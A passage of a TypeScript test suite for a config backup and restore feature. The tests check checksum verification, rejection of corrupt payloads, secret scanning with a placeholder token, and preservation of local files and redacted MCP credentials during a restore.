    expect(await fs.readFile(path.join(restoreRoot, "AGENTS.md"), "utf-8")).toBe("local\n");
  });

  it("refuses to restore a file onto an existing directory", async () => {
    await write(muxRoot, "AGENTS.md", "from backup\n");
    await write(muxRoot, "skills/demo", "a file, not a directory\n");
    const payload = await createBackupPayload({
      muxRoot,
      muxVersion: "1.2.3",
      sourceLabel: "test-host",
    });

    const restoreRoot = path.join(tempDir, "type-clash");
    await write(restoreRoot, "AGENTS.md", "local\n");
    await fs.mkdir(path.join(restoreRoot, "skills/demo"), { recursive: true });

    try {
      await restoreBackupPayload({ muxRoot: restoreRoot, payload });
      throw new Error("Expected the directory clash to be refused");
    } catch (error) {
      if (!(error instanceof Error)) throw error;
      expect(error.message).toContain("directory");
    }
    expect(await fs.readFile(path.join(restoreRoot, "AGENTS.md"), "utf-8")).toBe("local\n");
  });

  it("rejects a corrupt preferences payload before restoring any file", async () => {
    await write(muxRoot, "AGENTS.md", "backed up\n");
    const payload = await createBackupPayload({
      muxRoot,
      muxVersion: "1.2.3",
      sourceLabel: "test-host",
    });
    const destination = path.join(tempDir, "corrupt");
    await writeBackupPayload(destination, payload);

    const corrupt = Buffer.from('{"appearance":{"theme":123}}\n', "utf-8");
    await fs.writeFile(path.join(destination, "preferences.json"), corrupt);
    const manifestPath = path.join(destination, "manifest.json");
    const manifest = JSON.parse(await fs.readFile(manifestPath, "utf-8")) as {
      files: Array<{ path: string; sha256: string }>;
    };
    const entry = manifest.files.find((file) => file.path === "preferences.json");
    if (!entry) throw new Error("Expected a preferences entry");
    entry.sha256 = createHash("sha256").update(corrupt).digest("hex");
    await fs.writeFile(manifestPath, JSON.stringify(manifest, null, 2), "utf-8");

    const restoreRoot = path.join(tempDir, "corrupt-target");
    await fs.mkdir(restoreRoot, { recursive: true });
    try {
      await readBackupPayload(destination);
      throw new Error("Expected the corrupt payload to be rejected");
    } catch (error) {
      if (!(error instanceof Error)) throw error;
      expect(error.message).not.toContain("Expected the corrupt payload");
    }
    expect(await fs.readdir(restoreRoot)).toEqual([]);
  });

  it("keeps a backup readable when the build stamp is missing", async () => {
    await write(muxRoot, "AGENTS.md", "instructions\n");
    const payload = await createBackupPayload({
      muxRoot,
      // A build whose version metadata is unavailable must not produce a manifest that
      // this same code then rejects, which would make the backup unrestorable.
      muxVersion: undefined as unknown as string,
      sourceLabel: "test-host",
    });
    const destination = path.join(tempDir, "no-version");
    await writeBackupPayload(destination, payload);

    const reread = await readBackupPayload(destination);
    expect(reread.files.some((file) => file.path === "AGENTS.md")).toBe(true);
  });

  it("reuses the manifest across identical exports so a backup is a no-op", async () => {
    await write(muxRoot, "AGENTS.md", "instructions\n");
    const destination = path.join(tempDir, "stable");

    const first = await createBackupPayload({
      muxRoot,
      muxVersion: undefined as unknown as string,
      sourceLabel: "test-host",
    });
    await writeBackupPayload(destination, first);
    const firstBytes = await fs.readFile(path.join(destination, "manifest.json"));

    const second = await createBackupPayload({
      muxRoot,
      muxVersion: undefined as unknown as string,
      sourceLabel: "test-host",
      exportedAt: "2099-01-01T00:00:00.000Z",
    });
    await writeBackupPayload(destination, second);

    expect(await fs.readFile(path.join(destination, "manifest.json"))).toEqual(firstBytes);
  });

  it("writes and verifies manifest hashes", async () => {
    await write(muxRoot, "AGENTS.md", "instructions\n");
    const payload = await createBackupPayload({
      muxRoot,
      muxVersion: "1.2.3",
      sourceLabel: "test-host",
    });
    const destination = path.join(tempDir, "payload");
    await writeBackupPayload(destination, payload);

    const loaded = await readBackupPayload(destination);
    expect(payloadFileText(loaded, "AGENTS.md")).toBe("instructions\n");
    expect(loaded.redactions).toEqual(payload.redactions);

    await write(destination, "AGENTS.md", "tampered\n");
    try {
      await readBackupPayload(destination);
      throw new Error("Expected checksum rejection");
    } catch (error) {
      if (!(error instanceof Error)) throw error;
      expect(error.message).toContain("checksum mismatch");
    }
  });

  it("blocks high-confidence secrets in free-form files", async () => {
    await write(muxRoot, "AGENTS.md", "token ghp_123456789012345678901234567890123456\n");

    try {
      await createBackupPayload({ muxRoot, muxVersion: "1.2.3", sourceLabel: "test-host" });
      throw new Error("Expected secret scan rejection");
    } catch (error) {
      if (!(error instanceof Error)) throw error;
      expect(error.message).toContain("AGENTS.md");
    }
  });

  it("restores backed-up files without deleting local-only files or redacted MCP values", async () => {
    await write(muxRoot, "skills/shared/SKILL.md", "from backup\n");
    await write(muxRoot, "memory/global/shared.md", "backup memory\n");
    await write(
      muxRoot,
      "mcp.jsonc",
      JSON.stringify({
        servers: {
          api: {
            url: "https://backup-token@example.com/mcp?token=backup-token",
            headers: {
              Authorization: "Bearer backup-token",
              Portable: { secret: "PORTABLE_TOKEN" },
            },
          },
        },
      })
    );
    const payload = await createBackupPayload({
      muxRoot,
      muxVersion: "1.2.3",
      sourceLabel: "source",
      preferences: {
        appearance: { theme: "dark" },
        navigation: { launchBehavior: "last-workspace" },
        review: { includeUncommitted: true },
      },
    });

    const restoreRoot = path.join(tempDir, "restore-root");
    await write(restoreRoot, "skills/local/SKILL.md", "local only\n");
    await write(restoreRoot, "memory/global/local.md", "local memory\n");
    await write(
      restoreRoot,
      "mcp.jsonc",
      JSON.stringify({
        servers: {
          api: {
            url: "https://local-token@example.com/mcp?token=local-token",
            headers: {
              Authorization: "Bearer local-token",
              Portable: { secret: "OLD_TOKEN" },
            },
          },
        },
      })
    );

    const result = await restoreBackupPayload({
      muxRoot: restoreRoot,
      payload,
      currentPreferences: {
        appearance: { theme: "light", vimEnabled: true },
        navigation: { projectOrder: ["/local/project"] },
        review: { defaultBaseByProject: { "/local/project": "dev" } },
      },
    });

    expect(await fs.readFile(path.join(restoreRoot, "skills/shared/SKILL.md"), "utf-8")).toBe(
      "from backup\n"
    );
    expect(await fs.readFile(path.join(restoreRoot, "skills/local/SKILL.md"), "utf-8")).toBe(
      "local only\n"
    );
    expect(result.localOnlyFiles).toEqual(["memory/global/local.md", "skills/local/SKILL.md"]);
    expect(result.preferences).toEqual({
      appearance: { theme: "dark", vimEnabled: true },
      navigation: {
        launchBehavior: "last-workspace",
        projectOrder: ["/local/project"],
      },
      review: {
        includeUncommitted: true,
        defaultBaseByProject: { "/local/project": "dev" },
      },
    });

    const restoredMcp = jsonc.parse(
      await fs.readFile(path.join(restoreRoot, "mcp.jsonc"), "utf-8")
    ) as {
      servers: { api: { url: string; headers: Record<string, unknown> } };
    };
    expect(restoredMcp.servers.api.url).toBe(
      "https://local-token@example.com/mcp?token=local-token"
    );
    expect(restoredMcp.servers.api.headers.Authorization).toBe("Bearer local-token");
    expect(restoredMcp.servers.api.headers.Portable).toEqual({ secret: "PORTABLE_TOKEN" });
  });
});
